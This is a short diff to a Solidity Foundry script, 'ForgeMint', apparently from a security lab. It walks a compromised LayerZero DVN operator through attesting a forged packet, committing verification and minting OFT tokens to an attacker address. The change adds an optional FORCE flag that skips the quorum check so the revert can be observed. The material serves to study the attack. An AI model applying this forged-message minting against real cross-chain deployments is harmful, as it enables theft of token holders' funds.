@@ -14,7 +14,7 @@ import {LabDVN} from "../src/lab/LabDVN.sol";
 ///   2. commitVerification                          (permissionless; reverts unless the OApp's DVN quorum is met)
 ///   3. lzReceive -> OFT mints to the attacker      (permissionless)
 /// Stops after step 1 if the receive config needs more DVNs than the attacker controls.
-/// env: PRIVATE_KEY (the compromised DVN operator), ASSET, AMOUNT (whole tokens), ATTACKER
+/// env: PRIVATE_KEY (the compromised DVN operator), ASSET, AMOUNT (whole tokens), ATTACKER, FORCE (optional)
 contract ForgeMint is LabBase {
     function run() external {
         string memory asset = vm.envString("ASSET");
@@ -39,7 +39,8 @@ contract ForgeMint is LabBase {
         console.log("1. compromised LabDVN attested the forged packet");
 
         UlnConfig memory cfg = receiveLib.getUlnConfig(receiver, srcEid);
-        if (!receiveLib.verifiable(cfg, keccak256(header), payloadHash)) {
+        // FORCE=1 skips the check so the commit itself shows why it fails (use without --broadcast)
+        if (!vm.envOr("FORCE", false) && !receiveLib.verifiable(cfg, keccak256(header), payloadHash)) {
             console.log("2. BLOCKED: commitVerification would revert, receive config requires DVNs:", cfg.requiredDVNCount);
             vm.stopBroadcast();
             return;
